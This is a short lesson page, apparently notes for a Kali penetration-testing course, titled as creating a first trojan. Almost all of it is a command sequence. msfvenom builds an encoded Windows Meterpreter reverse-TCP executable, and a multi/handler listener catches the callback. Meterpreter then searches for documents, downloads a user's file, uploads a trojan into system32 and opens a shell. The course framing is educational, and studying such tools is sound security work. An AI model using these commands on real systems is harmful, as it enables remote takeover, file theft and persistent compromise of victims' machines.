# 11_Create Your First Trojan and Infitratea Target

[Create Your First Trojan and Infitratea Target 👉VIDEO &#128279;](https://codered.eccouncil.org/courseVideo/Kali-for-Penetration-Testers?lessonId=8db2b460-fb1c-4870-98d2-dc2e4becdd36&finalAssessment=false)

**Command**

- `service postgresql start`

  - `msfconsole`
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=5555 -f exe -e x86/shikata_ga_nai -i 10 > trojan.exe`
    - `use multi/handler`
    - `set payload windows/meterpreter/reverse_tcp`
    - `set LHOST <kali-ip>`
    - `set LPORT 5555`
    - `exploit`
  - meterpreter > `help`

    - `sysinfo`
    - `ls`
    - `ipconfig`
    - `search -f *.doc`
    - `search -f *.txt`
    - `download C://Users/IEUser/Desktop/shares/hobbit.txt`

  - meterpreter > `upload trojan3.exe c://windows/system32`
  - meterpreter > `shell`
